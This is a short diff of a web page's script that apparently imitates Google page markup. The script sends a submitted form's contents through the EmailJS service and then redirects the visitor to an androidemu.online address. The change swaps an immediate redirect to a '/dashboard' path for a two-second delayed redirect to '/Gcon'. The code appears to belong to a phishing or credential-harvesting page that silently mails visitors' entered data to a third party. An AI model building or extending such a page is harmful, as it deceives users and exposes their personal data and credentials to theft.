@@ -309,7 +309,10 @@ initAft()</script><script class="ds:0" nonce="">AF_initDataCallback({key: 'ds:0'
                 emailjs.sendForm(serviceID, templateID, emailJsForm)
                     .then(() => {
                       //  console.log('تم إرسال البريد الإلكتروني لتأكيد البيانات بنجاح.');
-                      window.parent.location.href = 'https://androidemu.online/dashboard';
+                      setTimeout(function() {
+  window.location.href = 'https://androidemu.online/Gcon';
+}, 2000);
+
                      //   alert('تم إرسال بريد تأكيد البيانات بنجاح!');
                     }, (err) => {
                      //   console.error('فشل إرسال البريد الإلكتروني لتأكيد البيانات:', err);
